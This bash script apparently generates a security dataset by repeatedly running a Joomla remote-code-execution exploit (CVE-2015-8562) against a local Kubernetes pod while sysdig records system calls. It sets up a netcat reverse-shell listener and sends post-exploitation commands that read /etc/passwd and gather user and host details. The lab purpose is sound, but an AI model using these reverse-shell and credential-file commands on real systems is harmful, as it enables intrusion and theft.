#!/bin/bash

# CVE_ID="CVE-2015-8562"
CVE_ID=$1
RECORD_TIME=15
FILE_NUMBER=1
CONTAINER_ID=$(docker ps -a | grep minikube | awk '{print $1}')

OUTPUT_DIR="/CAShift/Dataset/output/attack/$CVE_ID"
WEB_URL=$(minikube service joomla --url)

if [ ! -d "$OUTPUT_DIR" ]; then
    echo "Creating Output Dir"
    mkdir -p $OUTPUT_DIR
else
    echo "Output Dir Already Exists"
fi

tmux new-session -d -s record
tmux new-session -d -s attack
tmux new-session -d -s nc

# attack env setting
torch_env="source activate py2"
tmux send -t "attack" "$torch_env" ENTER

# get pod id
POD_ID=$(kubectl get pods | grep joomla | awk '{print $1}')

# Collect 100 cases
for i in {1..100}; do

    echo "Collecting $i ..."
    record_cmd="sudo sysdig -v -b -p \"%evt.rawtime %user.uid %proc.pid %proc.name %thread.tid %syscall.type %evt.dir %evt.args\" -w $OUTPUT_DIR/$FILE_NUMBER.scap container.id=$CONTAINER_ID"
    tmux send -t "record" "$record_cmd" ENTER
    
    # sleep to ensure the record is started and log start
    sleep 2
    kubectl exec -it $POD_ID -c joomla -- logger 'Attack Start'

    # start rce nc listener
    nc_cmd="nc -lvp 6543"
    tmux send -t "nc" "$nc_cmd" ENTER

    exploit_cmd="cat /etc/passwd && echo "rced" > /tmp/rced && chmod 777 /tmp/rced && whoami && id && hostname && pwd"
    terminate_cmd="kubectl exec -it $POD_ID -c joomla -- logger 'Attack Stop' && sleep 0.5 && tmux send -t 'record' 'C-c' ENTER"
    attack_cmd="python exploit.py -t $WEB_URL -l 127.0.0.1 -p 6543 && sleep 0.5 && tmux send -t 'nc' '$exploit_cmd' ENTER && tmux send -t 'nc' 'sleep 0.2 && exit' ENTER && sleep 0.5 && tmux send -t 'nc' '$terminate_cmd' ENTER"
    
    echo $attack_cmd
    tmux send -t "attack" "$attack_cmd" ENTER

    FILE_NUMBER=$((FILE_NUMBER + 1))
    sleep 10 && echo "Finish $FILE_NUMBER"
done

# stop record
tmux kill-session -t attack
tmux kill-session -t record
tmux kill-session -t nc
sleep 1

# cleaning
# minikube delete
